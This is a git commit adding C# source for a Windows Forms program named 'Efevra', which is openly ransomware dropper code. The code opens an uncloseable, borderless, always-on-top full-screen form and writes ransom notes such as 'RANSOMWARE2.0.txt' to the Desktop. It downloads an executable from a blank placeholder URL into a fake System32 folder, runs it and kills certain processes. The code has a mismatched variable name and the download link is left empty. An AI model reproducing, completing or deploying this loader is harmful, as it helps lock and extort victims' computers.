b43c2b16409b6895ea0ab50cb41b67c18545b61c
Marcel <79818491+IkigaiHack@users.noreply.github.com>
2022-03-06 01:23:54 +0100

    Add files via upload

---
+++ Efevra/Efevra/Form1.Designer.cs
@@ -0,0 +1,55 @@
+﻿namespace Efevra
+{
+    partial class Efevra
+    {
+        /// <summary>
+        /// Wymagana zmienna projektanta.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Wyczyść wszystkie używane zasoby.
+        /// </summary>
+        /// <param name="disposing">prawda, jeżeli zarządzane zasoby powinny zostać zlikwidowane; Fałsz w przeciwnym wypadku.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Kod generowany przez Projektanta formularzy systemu Windows
+
+        /// <summary>
+        /// Metoda wymagana do obsługi projektanta — nie należy modyfikować
+        /// jej zawartości w edytorze kodu.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.SuspendLayout();
+            // 
+            // Efevra
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(99, 90);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            this.MaximizeBox = false;
+            this.MinimizeBox = false;
+            this.Name = "Efevra";
+            this.ShowIcon = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.Manual;
+            this.Text = "Efevra";
+            this.TopMost = true;
+            this.FormClosing += new System.Windows.Forms.FormClosingEventHandler(this.Efevra_FormClosing);
+            this.Load += new System.EventHandler(this.Efevra_Load);
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+    }
+}
+
---
+++ Efevra/Efevra/Form1.cs
@@ -0,0 +1,96 @@
+﻿using System;
+using System.Collections.Generic;
+using System.ComponentModel;
+using System.Data;
+using System.Drawing;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Text;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+using System.Diagnostics;
+
+
+
+namespace Efevra
+{
+    public partial class Efevra : Form
+    {
+        private string patcachefile;
+
+        public Efevra()
+        {
+            InitializeComponent();
+            this.TransparencyKey = this.BackColor;
+        }
+
+        public StreamWriter StreamWriter { get; private set; }
+
+        private void Efevra_FormClosing(object sender, FormClosingEventArgs e)
+        {
+
+            e.Cancel = true;
+        }
+
+
+            
+
+        private void Efevra_Load(object sender, EventArgs e)
+        {
+                this.Left = 0;
+                this.Top = 0;
+                this.Width = Screen.PrimaryScreen.Bounds.Width;
+                this.Height = Screen.PrimaryScreen.Bounds.Height;
+
+                string path_cahce = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                string existfile = path_cahce + @"\.cache_DCQPKX";
+
+
+                if (!File.Exists(existfile))
+                {
+                    string pathcachefile = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+
+                    using (StreamWriter streamWriter = File.CreateText(patcachefile + @"\._cache_DCQPKX.exe"))
+                    {
+                        streamWriter.WriteLine("Your files are lock");
+                    }
+                }
+
+                string path = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
+                using (StreamWriter streamWriter = File.CreateText(path + @"\RANSOMWARE2.0.txt"))
+                {
+                    streamWriter.WriteLine("Your files has been locked");
+
+                }
+
+                ServicePointManager.Expect100Continue = true;
+                ServicePointManager.SecurityProtocol = (SecurityProtocolType)3072;
+                WebClient webClient = new WebClient();
+                webClient.DownloadFile("", @"C:\Program Files\System32\Ransomware2.0.exe"); //LINK
+
+                Process.Start("C:\\Program Files\\System32\\Ransomware2.0.exe");
+
+
+                Process[] _process = null;
+                _process = Process.GetProcessesByName("DCQPKX");
+                foreach (Process proces in _process)
+                {
+                    proces.Kill();
+                }
+
+                Process[] _process2 = null;
+                _process2 = Process.GetProcessesByName("._cache_DCQPKX");
+                foreach (Process proces2 in _process2)
+                {
+                    proces2.Kill();
+
+
+
+                }
+
+
+            }
+        }
+    }
+
